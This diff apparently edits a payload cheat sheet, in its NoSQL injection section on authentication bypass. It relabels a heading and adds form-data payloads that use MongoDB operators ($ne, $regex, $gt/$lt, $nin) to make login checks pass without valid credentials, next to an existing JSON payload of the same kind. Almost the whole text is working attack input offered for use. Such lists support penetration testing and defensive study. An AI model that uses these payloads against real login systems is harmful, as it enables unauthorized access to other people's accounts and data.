@@ -27,8 +27,11 @@
 Basic authentication bypass using not equal ($ne) or greater ($gt)
 
 ```json
-in URL
+in DATA
 username[$ne]=toto&password[$ne]=toto
+login[$regex]=a.*&pass[$ne]=lol
+login[$gt]=admin&login[$lt]=test&pass[$ne]=1
+login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 
 in JSON
 {"username": {"$ne": null}, "password": {"$ne": null}}
